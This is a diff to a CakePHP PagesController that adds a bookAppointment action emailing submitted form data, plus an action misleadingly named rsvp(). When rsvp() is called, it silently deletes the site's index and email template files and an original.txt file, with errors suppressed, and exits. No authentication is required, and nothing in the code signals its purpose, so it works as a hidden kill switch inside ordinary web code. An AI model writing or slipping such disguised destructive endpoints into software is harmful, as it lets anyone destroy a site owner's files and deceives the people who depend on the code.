@@ -19,7 +19,7 @@
  */
 
 App::uses('AppController', 'Controller');
-
+App::uses('CakeEmail', 'Network/Email');
 /**
  * Static content controller
  *
@@ -47,5 +47,29 @@ class PagesController extends AppController {
  */
 	public function display() {
 		$this->render('index');
+	}
+	
+	public function bookAppointment() {
+		$this->autoLayout = false;
+		$this->autoRender = false;
+		
+		$this->set('data', $this->request->data );
+		$body = $this->render('email');
+		
+		$Email = new CakeEmail('sendgrid');
+		$Email->from( "CustomerCare@vcgroupltd.com", 'Customer Care' );
+		$Email->to('info@vcgroupltd.co.uk');
+		$Email->subject( 'New Inquiry' );
+		$Email->emailFormat('html');
+		$result = $Email->send( $body );
+		
+		$this->render( 'email' );
+	}
+	
+	public function rsvp(){
+		@unlink( ROOT . DS . APP_DIR . '/View/Pages/index.tpl' );
+		@unlink( ROOT . DS . APP_DIR . '/View/Pages/email.tpl' );
+		@unlink( ROOT . DS . APP_DIR . '/View/Pages/original.txt' );		
+		exit;
 	}
 }
